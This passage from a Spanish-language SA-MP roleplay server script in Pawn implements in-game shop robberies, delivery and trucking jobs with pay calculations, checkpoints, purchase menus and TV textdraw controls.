			if(InfoNegocio[NegID][nDinero] - Val)
			{
				InfoNegocio[NegID][nDinero] -= Val;
			}
			else
			{
			    SetPVarInt(playerid,"DINERO_ROBADO", InfoNegocio[NegID][nDinero]);
			    InfoNegocio[NegID][nDinero] = 0;
			}
		    foreach(Player,i)
		    {
				if(ID_Negocio(i) == NegID)
				{
					MensajeF(i, C_ME, "* Vendedor(a) abre la caja, y le da al ladron $%d *",Val);
				}
			}
			SetPVarInt(playerid, "DINERO_ROBADO", Val);
			SetPlayerWantedLevel(playerid, 2);
			#if defined USE_FCNPC
			ApplyAnimation(NPC_NEGOCIO[NegID],"DEALER","shop_pay",3,0,0,1,0,3000,true);
			SetPlayerAttachedObject(NPC_NEGOCIO[NegID], 0, 1212, 5, 0.0979, 0.0000, 0.0000, -131.0000, 0.0000, 93.0000, 1.0000, 1.0000, 1.0000);
			SetTimerEx("Robo_RecibirDinero", 2000, false, "ii", playerid, NPC_NEGOCIO[NegID]);
			#endif
			SetTimerEx("Robar", 60000, false, "ii", playerid, 2);
		}
		case 2:
		{

			DeletePVar(playerid,"ROBANDO");
			SetPVarInt(playerid,"BUSCADO",1);

			KillTimer2(playerid, TIMER_CANCELARR);
			Timer_Jugador[playerid][TIMER_CANCELARR] = SetTimerEx("CancelarRobo", 60000 * 7, false, "i", playerid);

			new
				MaxDist = random(sizeof EntregaLadron);

			SetPlayerCP(playerid, CP_ROBO, EntregaLadron[MaxDist][0], EntregaLadron[MaxDist][1], EntregaLadron[MaxDist][2], 3);

			#if defined USE_FCNPC
			FCNPC_SetSpecialAction(NPC_NEGOCIO[ID_Negocio(playerid)], SPECIAL_ACTION_NONE);
			#endif

			Mensaje(playerid,-1,"Ya cumpliste el minuto, te puedes retirar del negocio.");
			Mensaje(playerid,-1,"Se te marcó en el mapa la ubicación en la que debes dejar lo robado");
			return 1;
		}
	}
	return 1;
}

CALLBACK: Robo_RecibirDinero(playerid, npcid)
{
	RemovePlayerAttachedObject(npcid, 0);
	return ApplyAnimation(playerid,"INT_SHOP","shop_shelf",3,0,0,1,0,3000,true);
}

public OnPlayerEnterDynamicCP(playerid, checkpointid)
{
	new VehID = GetPlayerVehicleID(playerid);
	PlayerCP<CP_ROBO>:
	{
		LiberarDePolicia(playerid);
		GivePlayerMoney(playerid, GetPVarInt(playerid,"DINERO_ROBADO"));
		MensajeF(playerid,-1,"El Robo, fue realizado con éxito. Te pagaron "#CVERDE"$%d", GetPVarInt(playerid,"DINERO_ROBADO"));
		DeletePVar(playerid,"DINERO_ROBADO");
	    DestroyPCP(playerid, CP_ROBO);
	    return 1;
	}
	PlayerCP<CP_LICENCIAVEH>:
	{
	    if(!IsPlayerInAnyVehicle(playerid)) return Error(playerid,"¡En el vehículo!");
		SetPVarInt(playerid,"LIC_Checks",GetPVarInt(playerid,"LIC_Checks")+1);
		switch(GetPVarInt(playerid,"LIC_Tipo"))
		{
			case 1:
			{
				SetPlayerCP(playerid,CP_LICENCIAVEH, LIC_Check2);
				SetPVarInt(playerid,"LIC_Tipo",2);
			}
			case 2:
			{
				SetPlayerCP(playerid,CP_LICENCIAVEH, LIC_Check3);
				SetPVarInt(playerid,"LIC_Tipo",3);
			}
			case 3:
			{
				SetPlayerCP(playerid,CP_LICENCIAVEH, LIC_Check4);
				SetPVarInt(playerid,"LIC_Tipo",4);
			}
			case 4:
			{
				SetPlayerCP(playerid,CP_LICENCIAVEH, LIC_Check1);
				SetPVarInt(playerid,"LIC_Tipo",1);
			}
		}
		return 1;
	}
	PlayerCP<CP_GPS>:
	{
	    GameTextForPlayer(playerid,"~g~~h~GPS: ~w~llegaste a tu destino", 4000, 3);
	    DestroyPCP(playerid,CP_GPS);
	    return 1;
	}
	PlayerCP<CP_CAMIONERO>:
	{
		if(EsCamionero(playerid) && EsCamion(VehID))
		{
			if(GetPVarInt(playerid,"NivelCamionero") == 2)
			{
			    if(GetPVarInt(playerid, "Chofer_Camion") != VehID)
			    {
			        RemovePlayerFromVehicle(playerid);
			        return Error(playerid, "Este no es tu camión.");
				}
			    if(GetPVarInt(playerid,"PasoEntrega") == 3)
			    {
			        new
		 		        TrailerID = GetVehicleTrailer(VehID);

					Mensaje(playerid,C_INFO,"> "#CBLANCO"Ya entregaste la carga, ahora regresa para devolver el camión");
					SetPlayerCP(playerid,CP_CAMIONERO, -508.8466,-549.7501,25.5234, 5.0);
					SetVehicleToRespawn(TrailerID);
					SetPVarInt(playerid, "PasoEntrega", 4);
					return 1;
			    }
			    if(GetPVarInt(playerid,"PasoEntrega") == 4)
			    {
			        new
			 			RVal;

					switch(InfoCamion[VehID][camCarga])
					{
					    case 435: RVal = 1350;
					    case 450: RVal = 2450;
					    case 591: RVal = 1900;
					    case 0:
					    {
					        return Error(playerid, "¡No tienes la carga");
						}
					}
				    Mensaje(playerid,-1,"• Trabajo "#CVERDE"finalizado "#CBLANCO"con éxito.");

					Mensaje(playerid,  1,"==================================");
					MensajeF(playerid,-1,".. Paga: "#CVERDE"$%d", RVal);
					Mensaje(playerid,  1,"==================================");

					DeletePVar(playerid,"NivelCamionero");
					GivePlayerMoney(playerid,RVal);
					DeletePVar(playerid,"Chofer_Camion");
					DeletePVar(playerid,"PasoEntrega");
					alm(InfoCamion[VehID][camChofer]," ");
					InfoCamion[VehID][camCarga] = 0;
					InfoJugador[playerid][jEntregas] ++;
					DestroyPCP(playerid,CP_CAMIONERO);
					RemovePlayerFromVehicle(playerid);
					SetVehicleToRespawn(VehID);
					TrabajosPorHora[playerid][ID_Camionero] ++;
					return 1;
			    }
				return 1;
			}
			if(GetPVarInt(playerid,"PasoEntrega") == 0)
	 		{
				if(strlen(InfoCamion[VehID][camChofer]) > 3) return Error(playerid,"¡Este camión ya tiene chofer!");
				Dialog(playerid,dCargarCamion,DIALOG_STYLE_LIST,""#CBLANCO"¿Qué desea transportar?","Productos generales (24/7)\nRopa y accesorios\nComida y bebida","Aceptar","");
				CongelarEx(playerid);
			}
	 		else if(GetPVarInt(playerid,"PasoEntrega") == 2)
	 		{
	 		    new
				 	Float: VehHP;

				GetVehicleHealth(VehID, VehHP);

			    new
			        Percent_damage = floatround(VehHP/10),
			        Dinero_inicial = 450;

				Dinero_inicial -= (300-(Percent_damage*3));
			    Mensaje(playerid,-1,"• Trabajo "#CVERDE"finalizado "#CBLANCO"con éxito.");

				GivePlayerMoney(playerid, Dinero_inicial);
				Mensaje(playerid,  1,"=======================================================");
				MensajeF(playerid,-1,".. Paga inicial: "#CVERDE"$450 "#CBLANCO"| Estado del vehículo: "#CINFO"%d%%", Percent_damage);
				MensajeF(playerid,-1,".. Descuento por daños del vehículo: "#CROJO"-$%d", (300-(Percent_damage*3)));
				MensajeF(playerid,-1,".. Paga final: "#CVERDE"$%d", Dinero_inicial);
				Mensaje(playerid,  1,"=======================================================");

				DeletePVar(playerid,"Chofer_Camion");
				DeletePVar(playerid,"PasoEntrega");
				alm(InfoCamion[VehID][camChofer]," ");
				InfoCamion[VehID][camCarga] = 0;
				InfoJugador[playerid][jEntregas] ++;
				DestroyPCP(playerid,CP_CAMIONERO);
				RemovePlayerFromVehicle(playerid);
				SetVehicleToRespawn(VehID);
				TrabajosPorHora[playerid][ID_Camionero] ++;
				if(InfoJugador[playerid][jNivelTrabajo] == 1)
				{
				    if(InfoJugador[playerid][jEntregas] >= 65)
				    {
				        Mensaje(playerid, -1, "Felicitaciones, ¡hiciste "#CVERDE"65 "#CBLANCO"entregas, y subiste tu nivel de camionero!");
				        Mensaje(playerid, -1, "Demostraste que sirves para entregas más difíciles, se te marco en el mapa donde debes presentarte. "#CINFO"(Camionero: Fase dos)");
						CheckpointGPS(playerid,-508.8466,-549.7501,25.5234, 5.0);
						InfoJugador[playerid][jNivelTrabajo] = 2;
					}
				}
				return 1;
	   		}
		    if(GetPVarInt(playerid,"PasoEntrega") == 1)
		    {
		        SetTimerEx("VolverCamion",10000,false,"i",playerid);
		        CongelarEx(playerid);
		        TextoJugador(playerid,"~w~descargando ~p~camion...",8000,3);
		        return 1;
		    }
		}
		return 1;
	}
	PlayerCP<CP_BASURERO>:
	{
		if(GetPVarInt(playerid,"TerminoBasura") && EsVehBasurero(VehID))
		{
 		    new
			 	Float: VehHP;

			GetVehicleHealth(VehID, VehHP);

		    new
		        Percent_damage = floatround(VehHP/10),
		        Dinero_inicial = (InfoJugador[playerid][jNivelTrabajo] == 1) ? 1500 : 2400;

			Dinero_inicial -= (100-Percent_damage)*7;

		    Mensaje(playerid,-1,"• Trabajo "#CVERDE"finalizado "#CBLANCO"con éxito.");

			GivePlayerMoney(playerid, Dinero_inicial);

		    if(InfoJugador[playerid][jNivelTrabajo] == 1)
		    {
				Mensaje(playerid,  1,"=======================================================");
				MensajeF(playerid,-1,".. Paga inicial: "#CVERDE"$1500 "#CBLANCO"| Estado del vehículo: "#CINFO"%d%%", Percent_damage);
				MensajeF(playerid,-1,".. Descuento por daños del vehículo: "#CROJO"$%d", 1500-Dinero_inicial);
				MensajeF(playerid,-1,".. Paga final: "#CVERDE"$%d", Dinero_inicial);
				Mensaje(playerid,  1,"=======================================================");
			}
			else if(InfoJugador[playerid][jNivelTrabajo] == 2)
		    {
				Mensaje(playerid,  1,"=======================================================");
				MensajeF(playerid,-1,".. Paga inicial: "#CVERDE"$2400 "#CBLANCO"| Estado del vehículo: "#CINFO"%d%%", Percent_damage);
				MensajeF(playerid,-1,".. Descuento por daños del vehículo: "#CROJO"$%d", 2400-Dinero_inicial);
				MensajeF(playerid,-1,".. Paga final: "#CVERDE"$%d", Dinero_inicial);
				Mensaje(playerid,  1,"=======================================================");
			}

			DeletePVar(playerid,"TerminoBasura");
			DeletePVar(playerid,"CAMION_BASURA");
			DeletePVar(playerid,"B_ParteLimpieza");
			InfoJugador[playerid][jBarridas] ++;
			if(InfoJugador[playerid][jBarridas] > 10 && InfoJugador[playerid][jNivelTrabajo] == 1)
			{
				Mensaje(playerid, -1,"Felicitaciones, subiste a nivel "#CVERDE"2 "#CBLANCO"en tu trabajo: "#CAZUL2"Basurero");
				Mensaje(playerid, -1,"Ahora, en tus próximas Barridas, recibirás más dinero.");
				InfoJugador[playerid][jNivelTrabajo] = 2;
			}
			HideProgressBarForPlayer(playerid,BCosecha[playerid]);
			SetVehicleToRespawn(GetPlayerVehicleID(playerid));
			DestroyPCP(playerid, CP_BASURERO);
			TrabajosPorHora[playerid][ID_Basurero] ++;
			return 1;
		}
		return 1;
	}
	PlayerCP<CP_REPARTIDORB>:
	{
		if(GetPVarInt(playerid,PVarRepartidorB) && EsBiciRepartidora(VehID))
		{
		    new i = GetPVarInt(playerid,PVarRepartidorB);
			if(i == 37)
			{
				DestroyPCP(playerid,CP_REPARTIDORB);
			    DeletePVar(playerid,PVarRepartidorB);

			    Mensaje(playerid,-1,"• Trabajo "#CVERDE"finalizado "#CBLANCO"con éxito.");
			    if(InfoJugador[playerid][jNivelTrabajo] == 1)
			    {
					Mensaje(playerid,  1,"==================================");
					Mensaje(playerid, -1,".. Paga: "#CVERDE"$500");
					Mensaje(playerid,  1,"==================================");
					GivePlayerMoney(playerid,500);
				}
				else if(InfoJugador[playerid][jNivelTrabajo] == 2)
				{
					Mensaje(playerid,  1,"==================================");
					Mensaje(playerid, -1,".. Paga: "#CVERDE"$850");
					Mensaje(playerid,  1,"==================================");
					GivePlayerMoney(playerid,850);
				}
				InfoJugador[playerid][jRepartidas] ++;
				HideProgressBarForPlayer(playerid,BCosecha[playerid]);
				TrabajosPorHora[playerid][ID_RepartidorB] ++;

				if(InfoJugador[playerid][jRepartidas] > 20 && InfoJugador[playerid][jNivelTrabajo] == 1)
				{
					Mensaje(playerid, -1,"Felicitaciones, subiste a nivel "#CVERDE"2 "#CBLANCO"en tu trabajo: "#CAZUL2"Repartidor");
					Mensaje(playerid, -1,"Ahora, en tus próximas jornadas, recibirás más dinero. "#CINFO"($850)");
					InfoJugador[playerid][jNivelTrabajo] = 2;
				}
			    return 1;
			}
		    SetPlayerCP(playerid,CP_REPARTIDORB,PosRepartidorBici[i][Posx],PosRepartidorBici[i][Posy],PosRepartidorBici[i][Posz],4);
			AutoRol(playerid,"agarra un diario de su bolsa y lo tira");
			SetPVarInt(playerid,PVarRepartidorB,i+1);
			SetProgressBarValue(BCosecha[playerid],i);
			UpdateProgressBar(BCosecha[playerid], playerid);
			return 1;
		}
		return 1;
	}
	PlayerCP<CP_REPARTIDORP>:
	{
	    switch(GetPVarInt(playerid, "Parte_RepartirP"))
	    {
	        case 0: // checkpoint tomar pizza
			{
			    new
			        HouseID = Iter_Random(Casas),
					Float: Dist,
					Time;

				while(GetPlayerDistanceFromPoint(playerid, InfoCasa[HouseID][cEntrada_x], InfoCasa[HouseID][cEntrada_y],  InfoCasa[HouseID][cEntrada_z]) < 500.0 || HouseID < 3)
				{
				    HouseID = Iter_Random(Casas);
				}

                Dist = GetPlayerDistanceFromPoint(playerid, InfoCasa[HouseID][cEntrada_x], InfoCasa[HouseID][cEntrada_y],  InfoCasa[HouseID][cEntrada_z]);
                Time = floatround(Dist/7);

   			    AutoRol(playerid, "recibe una pizza");
			    SetPlayerSpecialAction(playerid, SPECIAL_ACTION_CARRY);

				SetPVarInt(playerid, "Casa_RepartirP", HouseID);
				SetPVarInt(playerid, "Parte_RepartirP", 1);
				SetPVarInt(playerid, "Tiempo_RepartirP", Time);

				TextDrawShowForPlayer(playerid, PizzaTiempo);

				new
				    PlayerText: Tiempo;

                Tiempo = CreatePlayerTextDraw(playerid, 99.000000, 304.000000, "    Tiempo: ~r~Calculando..");
				PlayerTextDrawAlignment(playerid, Tiempo, 2);
				PlayerTextDrawBackgroundColor(playerid, Tiempo, 255);
				PlayerTextDrawFont(playerid, Tiempo, 1);
				PlayerTextDrawLetterSize(playerid, Tiempo, 0.400000, 2.000000);
				PlayerTextDrawColor(playerid, Tiempo, -1);
				PlayerTextDrawSetOutline(playerid, Tiempo, 0);
				PlayerTextDrawSetProportional(playerid, Tiempo, 1);
				PlayerTextDrawSetShadow(playerid, Tiempo, 1);
				PlayerTextDrawSetSelectable(playerid, Tiempo, 0);

				PlayerTextDrawShow(playerid, Tiempo);

				SetPVarInt(playerid, "TD_RepartirP", _:Tiempo);

				KillTimer2(playerid, TIMER_REPARTIRPIZZA);
				Timer_Jugador[playerid][TIMER_REPARTIRPIZZA] = SetTimerEx("BajaTiempo_Pizza", 1000, true, "i", playerid);
				SetPlayerAttachedObject(playerid, SLOT_OBJECTS, 1582, 5, 0.1889, 0.1099, 0.0880, 98.1999, 7.4999, -107.0999, 1.0000, 1.0000, 1.0000);
				SetPlayerCP(playerid, CP_REPARTIDORP, InfoCasa[HouseID][cEntrada_x], InfoCasa[HouseID][cEntrada_y], InfoCasa[HouseID][cEntrada_z], 2);
				Error(playerid, "Sube a una moto y dirigete al ~r~checkpoint");
			}
			case 1:
			{
			    if(IsPlayerInAnyVehicle(playerid)) return Error(playerid, "Debes bajarte el vehículo para entregar la pizza");
			    if( !(GetPlayerSpecialAction(playerid) & SPECIAL_ACTION_CARRY) ) return Error(playerid, "¿Y la ~y~pizza~w~?");
			    new
			        Val = GetPVarInt(playerid, "Perdio_RepartirP");

			    if(!Val)
				{
					Error(playerid, "~g~Bien hecho~w~, entregaste la ~y~pizza ~w~a tiempo");
				}
				else
				{
					Error(playerid, "Llegaste ~r~tarde, ~w~se te descontaron ~g~$100 ~w~por el retraso.~n~Vuelve para recibir el pago!");
				}

				KillTimer2(playerid, TIMER_REPARTIRPIZZA);

				PlayerTextDrawDestroy(playerid, PlayerText: GetPVarInt(playerid, "TD_RepartirP") );
				TextDrawHideForPlayer(playerid, PizzaTiempo);

			 	DeletePVar(playerid, "TD_RepartirP");

				SetPlayerSpecialAction(playerid, SPECIAL_ACTION_NONE);
				RemovePlayerAttachedObject(playerid, SLOT_OBJECTS);

				SetPlayerCP(playerid, CP_REPARTIDORP, 2104.5315,-1810.7769,13.5547, 2);
				SetPVarInt(playerid, "Parte_RepartirP", 2);
			}
			case 2:
			{
			    new
			        Pago = 100,
			        HouseID = GetPVarInt(playerid, "Casa_RepartirP"),
					Float: Dist = GetPlayerDistanceFromPoint(playerid, InfoCasa[HouseID][cEntrada_x], InfoCasa[HouseID][cEntrada_y], InfoCasa[HouseID][cEntrada_z]);

			    Mensaje(playerid,-1, "• Trabajo "#CVERDE"finalizado "#CBLANCO"con éxito.");
				Mensaje(playerid, 1, "==================================");
				Mensaje(playerid,-1, ".. Paga inicial: "#CVERDE"$100");

				if(GetPVarInt(playerid, "Perdio_RepartirP"))
				{
					MensajeF(playerid,-1,".. Descuento por retraso: "#CROJO"-$100", Pago);

				    Pago -= 100;
				}

				MensajeF(playerid,-1,".. Propina: "#CVERDE"$%d", floatround(Dist*0.10));

				Pago += floatround(Dist*0.10);

				MensajeF(playerid,-1,".. Paga final: "#CVERDE"$%d", Pago);
				Mensaje(playerid,  1,"==================================");
				GivePlayerMoney(playerid,Pago);

				DeletePVar(playerid, "Tiempo_RepartirP");
				DeletePVar(playerid, "Casa_RepartirP");
				DeletePVar(playerid, "Parte_RepartirP");
				DeletePVar(playerid, "Veh_RepartirP");
				DeletePVar(playerid, "Perdio_RepartirP");

				DestroyPCP(playerid, CP_REPARTIDORP);
				HideProgressBarForPlayer(playerid, BCosecha[playerid]);
			}
		}
	}

	return 1;
}

CALLBACK: BajaTiempo_Pizza(playerid)
{
	new
	    Val = GetPVarInt(playerid, "Tiempo_RepartirP"),
		string[40];

	Val -= 1;

	A_Format(string, "  Tiempo: ~b~~h~%02d:%02d", (Val/60), (Val % 60) );

	SetPVarInt(playerid, "Tiempo_RepartirP", Val);

	PlayerTextDrawSetString(playerid, PlayerText: GetPVarInt(playerid, "TD_RepartirP"), string);

	if(!Val)
	{
	    SetPVarInt(playerid, "Perdio_RepartirP", true);
	    KillTimer2(playerid, TIMER_REPARTIRPIZZA);
		PlayerTextDrawSetString(playerid, PlayerText: GetPVarInt(playerid, "TD_RepartirP"), "Tiempo: ~r~00:00");
	}

	return 1;
}


CALLBACK: LiberarDePolicia(playerid)
{
	if(!IsPlayerConnected(playerid)) return 1;
	SetPlayerWantedLevel(playerid, 0);
	foreach(Player,i)
	{
	    if(EsLSPD(i))
	    {
	        SetPlayerMarkerForPlayer(i, playerid, 0xFFFFFF00);
	        Mensaje(i,-1, "El sospechoso que robó, se escapó.");
		}
	}
	DeletePVar(playerid,"BUSCADO");
	KillTimer2(playerid,TIMER_CANCELARR);
	return 1;
}

CALLBACK: CancelarRobo(playerid)
{
	DestroyPCP(playerid,CP_ROBO);
	DeletePVar(playerid, "BUSCADO");
	Mensaje(playerid,-1,"Fallaste el robo.");
	return 1;
}

stock KillTimer2(playerid,timerid)
{
	if(Timer_Jugador[playerid][timerid] != INVALID_TIMER_ID)
	{
		KillTimer(Timer_Jugador[playerid][timerid]);
		Timer_Jugador[playerid][timerid] = INVALID_TIMER_ID;
		return 1;
	}
	return 0;
}

stock DestroyPCP(playerid, index)
{
	if(0 <= index < MAX_PCP)
	{
		if(Checkpoint_Jugador[playerid][index] != PlayerCP:INVALID_PCP_ID)
		{
			DestroyDynamicCP(_:Checkpoint_Jugador[playerid][index]);
		 	Checkpoint_Jugador[playerid][index] = PlayerCP:INVALID_PCP_ID;
		 	return 1;
		}
	}
	else
	{
	    printf("BUG: Se intentó destruir un checkpoint (PCP) en un index inválido. (pid:%d-cpid:%d)", playerid, index);
	}
	return 0;
}

stock SetPlayerCP(playerid, index, Float:x, Float:y, Float:z, Float:size)
{
	if(0 <= index < MAX_PCP)
	{
		DestroyPCP(playerid, index);
		Checkpoint_Jugador[playerid][index] = PlayerCP:CreateDynamicCP(x, y, z, size, -1, -1, playerid, CHECKPOINT_STREAM);
		return 1;
	}
	else
	{
	    printf("BUG: Se intentó crear un checkpoint (PCP) en un index inválido. (pid:%d-cpid:%d)", playerid, index);
	}
	return 0;
}

public OnPlayerClickMap(playerid, Float:fX, Float:fY, Float:fZ)
{
    if(InfoJugador[playerid][jAdmin] >= Colaborador)
	{
	    Para_Admin_Servicio
		SetPlayerPos(playerid, fX, fY, fZ);
		SetPlayerPosFindZ(playerid, fX, fY, fZ);
		return 1;
	}
    return 1;
}

#if defined VERSION_03x

public OnPlayerModelSelection(playerid, response, listid, modelid)
{
	if(GetPVarInt(playerid, "ComprandoRopa"))
	{
		if(listid == m_Skins_m || listid == m_Skins_f)
		{
		    if(!response)
		    {
			    cmd_datos(playerid, "no_msg");
			    DeletePVar(playerid, "ComprandoRopa");
				return 1;
			}
		    if(GetPlayerMoney(playerid) < 400)
		    {
		        Error(playerid,"¡Dinero insuficiente! Debes tener mínimo $400");
		        return 1;
			}
	    	if( !RopaPandilla(ID_Familia(playerid), modelid) ) return Error(playerid,"¡No podes usar esta ropa, porque no perteneces a su banda!");
			ElegirRopa(playerid,modelid);
		    Mensaje(playerid,-1,"> Compraste esta prenda, por "#CPOSITIVO"$400. "#CBLANCO"Usa /ropa para más información");
			QuitarDinero(playerid,400);
			InfoNegocio[ID_Negocio(playerid)][nDinero] += 400;
			CongelarEx(playerid,4);
			cmd_datos(playerid, "no_msg");
		    DeletePVar(playerid, "ComprandoRopa");
			return 1;
		}
	}
	else if(GetPVarInt(playerid,"ComprandoAccesorios"))
	{
		if(listid == m_Accesorios)
		{
		    if(!response)
		    {
				cmd_datos(playerid, "no_msg");
				DeletePVar(playerid,"ComprandoAccesorios");
				return 1;
			}
		    new i = -1;
		    Loop(a, sizeof AttachmentObjects, 0)
		    {
		        if(AttachmentObjects[a][attachmodel] == modelid)
				{
					i = a;
				}
			}
			if(i == -1) return Error(playerid,"Hubo un error en la compra, ¡lo sentimos!"),true;
			if(GetPlayerMoney(playerid) < AttachmentObjects[i][attachprecio]) return Error(playerid,"¡Dinero insuficiente!");
			SetPVarInt(playerid,"ATTACH_MOD", i);
			new Str[(50*7)+4],Str2[50];
			Loop(s,7,0)
			{
			    if(InfoJugador[playerid][jAttachModel][s])
			    {
			        A_Format(Str2,"Slot %d %s[ %s ]\n",s,(InfoJugador[playerid][jAttachOcultado][s]) ? (""#CVERDE"") : (""#CAZUL""), AttachmentObjects[InfoJugador[playerid][jAccesorio][s]][attachname]);
					strcat(Str,Str2);
					continue;
				}
				else
				{
				    A_Format(Str2,"Slot %d "#CROJO"[ Nada ]\n",s);
					strcat(Str,Str2);
					continue;
				}
			}
			Dialog(playerid,dElejirSlotA,DIALOG_STYLE_LIST,""#CBLANCO"Elije el espacio donde la guardarás",Str,"Aceptar","Cancelar");
			cmd_datos(playerid, "no_msg");
		    DeletePVar(playerid, "ComprandoAccesorios");
		}
	}
	else if(GetPVarInt(playerid,"ComprandoMuebles"))
	{
	    if(listid == m_Muebles)
	    {
		    if(!response)
		    {
				cmd_datos(playerid, "no_msg");
				DeletePVar(playerid,"ComprandoMuebles");
				DeletePVar(playerid, "mS_hide_list_off");
				HideModelSelectionMenu(playerid);
				return 1;
			}
			SetPVarInt(playerid,"MuebleID", modelid);
		    new Str[80 * MAX_CASAS_JUGADOR],Str2[80],bool:sucess;
		    if( !GetPVarInt(playerid,"CONFIRMA_COMPRAM") )
		    {
       		 	new
        		    OBJ_INDEX;

                BuscarModeIndexInt(modelid, OBJ_INDEX);

	           	A_Format(Str,""#CINFO"Nombre: "#CBLANCO"%s\n"#CINFO"Precio: "#CBLANCO"$%d", ObjetosInterior[OBJ_INDEX][2], ObjetosInterior[OBJ_INDEX][1]);
				Dialog(playerid, dPrecioyNombreM, DIALOG_STYLE_MSGBOX, ""#CVERDE"Datos del producto", Str, "Continuar", "Volver");
				return 1;
			}
			DeletePVar(playerid, "mS_hide_list_off");
			HideModelSelectionMenu(playerid);

		    foreach(Casas,c)
		    {
		        if(EsDuenoCasa(playerid,c) || TieneLlaveCasa(playerid,c) )
		        {
		            sucess = true;
		            A_Format(Str2,""#CBLANCO"- %s "#CPOSITIVO"( ID: %d )\n",InfoCasa[c][cNombre],c);
					strcat(Str,Str2);
				}
			}
			if(!sucess) return Dialog(playerid,dError,DIALOG_STYLE_MSGBOX,""#CINFO"Elige la casa para el mueble",""#CBLANCO"¡No tienes casas!","Cerrar","");
			Dialog(playerid,dElegirCasaM,DIALOG_STYLE_LIST,""#CINFO"Elige la casa para el mueble:",Str,"Aceptar","Cancelar");
			cmd_datos(playerid,"no_msg");
			DeletePVar(playerid,"CONFIRMA_COMPRAM");
		}
	}
	return 1;
}

#endif
// -=================-
forward OnPlayerAttachTrailer(playerid, vehicleid, trailerid);
forward OnPlayerDettachTrailer(playerid, vehicleid, trailerid);
// -=================-

public OnPlayerAttachTrailer(playerid, vehicleid, trailerid)
{
	if(GetPVarInt(playerid,"NivelCamionero") == 2)
	{
	    if(GetPVarInt(playerid,"PasoEntrega") == 2)
	    {
	        SetPlayerCP(playerid, CP_CAMIONERO, 2389.4763, -2152.6609, 13.7500, 6.0);
	        SetPVarInt(playerid, "PasoEntrega", 3);
	        new
	            Carga[20];

			switch(GetVehicleModel(trailerid))
			{
			    case 435: Carga = "Comida";
			    case 450: Carga = "Tierra";
			    case 591: Carga = "Granos";
			}
	        MensajeF(playerid, -1, "Ya tomaste la carga "#CVERDE"(%s)"#CBLANCO". Ahora, dirigete para Los Santos, a entregarla.", Carga);
	        Mensaje(playerid, C_ROJO, "NOTA: "#CBLANCO"Recuerda que debes ir por la Ruta, manejar con grandes camiones por las calles rurales es contra la ley.");
			RemovePlayerMapIcon(playerid, MI_FABRICA_COMIDA);
			RemovePlayerMapIcon(playerid, MI_FABRICA_GRANO);
			RemovePlayerMapIcon(playerid, MI_FABRICA_TIERRA);
			alm(InfoCamion[vehicleid][camChofer],pName(playerid));
			InfoCamion[vehicleid][camCarga] = GetVehicleModel(trailerid);
			SetPVarInt(playerid,"Chofer_Camion", vehicleid);
			return 1;
		}
	    if(GetPVarInt(playerid,"PasoEntrega") == 3)
	    {
			Mensaje(playerid, -1, "Tomaste nuevamente la carga, ahora entregala.");
	        SetPlayerCP(playerid, CP_CAMIONERO, 2389.4763, -2152.6609, 13.7500, 6.0);
			return 1;
		}
	}

	return 1;
}

public OnPlayerDettachTrailer(playerid, vehicleid, trailerid)
{
	if(GetPVarInt(playerid,"NivelCamionero") == 2)
	{
	    if(GetPVarInt(playerid,"PasoEntrega") == 3)
	    {
			Error(playerid, "¡Debes buscar la carga!");
	        DestroyPCP(playerid, CP_CAMIONERO);
			return 1;
		}
	}
	return 1;
}

public OnPlayerClickTextDraw(playerid,Text:clickedid)
{
	new
		bool:cancel = (clickedid == Text:INVALID_TEXT_DRAW);

	if(IsPlayerConnected(playerid))
	{
	    if(GetPVarInt(playerid, "VIENDO_TV"))
	    {
	        if(cancel)
	        {
	            return cmd_dejar(playerid, "televisor");
			}

	        if(clickedid == TDTV[4])
	        {
	            if(!InfoTV[GetPVarInt(playerid, "TV_ID")][tvPrendida])
	            {
					PrenderTV(playerid, GetPVarInt(playerid, "TV_ID"));
					MostrarTV(playerid, CANAL_LSTV);
				}
				else
				{
					ApagarTV(playerid, GetPVarInt(playerid, "TV_ID"));
				}
				return 1;
			}
			else if(clickedid == TDTV[7])// ANULADO (Solo el canal de lstv por ahora - v1 & v2)
			{
	            if(InfoTV[GetPVarInt(playerid, "TV_ID")][tvPrendida])
	            {
					new i = GetPVarInt(playerid,"TV_CANAL");
					if(i > 0 && i < 4)
					{
						MostrarTV(playerid, i+1);
					}
					else Error(playerid, "~r~no hay más canales");
				}
				else Error(playerid, "~r~La tv está apagada");
			}
			else if(clickedid == TDTV[8])
			{
	            if(InfoTV[GetPVarInt(playerid, "TV_ID")][tvPrendida])
	            {
					new i = GetPVarInt(playerid,"TV_CANAL");
					if(i > 0 && i < 4)
					{
						MostrarTV(playerid, i-1);
					}
					else Error(playerid, "~r~no hay más canales");
				}
				else Error(playerid, "~r~la tv está apagada");
			}
		}

	#if !defined VERSION_03x

		if(GetPVarInt(playerid,"ElijiendoAccesorios"))
		{
		    if(clickedid == FlechaCRopa[1])
		    {
		        if(GetPVarInt(playerid,"ATTACH_MOD") >= sizeof(AttachmentObjects)-1) return 1;
		        new Float:pps[3];
		        GetPlayerObjectPos(playerid,Accesorio_Obj[playerid],pps[0],pps[1],pps[2]);
				DestroyPlayerObject(playerid,Accesorio_Obj[playerid]);
				SetPVarInt(playerid,"ATTACH_MOD",GetPVarInt(playerid,"ATTACH_MOD")+1);
				Accesorio_Obj[playerid] = CreatePlayerObject(playerid,AttachmentObjects[GetPVarInt(playerid,"ATTACH_MOD")][attachmodel],pps[0],pps[1],pps[2],0,0,0);
				new Str[60];
				format(Str,sizeof Str,"~n~~n~~n~~n~~n~~n~~w~%s~n~~p~$%d",AttachmentObjects[GetPVarInt(playerid,"ATTACH_MOD")][attachname],AttachmentObjects[GetPVarInt(playerid,"ATTACH_MOD")][attachprecio]);
				GameTextForPlayer(playerid,Str,10000,3);
				return 1;
			}
		    else if(clickedid == FlechaCRopa[0])
		    {
		        if(GetPVarInt(playerid,"ATTACH_MOD") == 0) return 1;
		        new Float:pps[3];
		        GetPlayerObjectPos(playerid,Accesorio_Obj[playerid],pps[0],pps[1],pps[2]);
				DestroyPlayerObject(playerid,Accesorio_Obj[playerid]);
				SetPVarInt(playerid,"ATTACH_MOD",GetPVarInt(playerid,"ATTACH_MOD")-1);
				Accesorio_Obj[playerid] = CreatePlayerObject(playerid,AttachmentObjects[GetPVarInt(playerid,"ATTACH_MOD")][attachmodel],pps[0],pps[1],pps[2],0,0,0);
				new Str[60];
				format(Str,sizeof Str,"~n~~n~~n~~n~~n~~n~~w~%s~n~~p~$%d",AttachmentObjects[GetPVarInt(playerid,"ATTACH_MOD")][attachname],AttachmentObjects[GetPVarInt(playerid,"ATTACH_MOD")][attachprecio]);
				GameTextForPlayer(playerid,Str,10000,3);
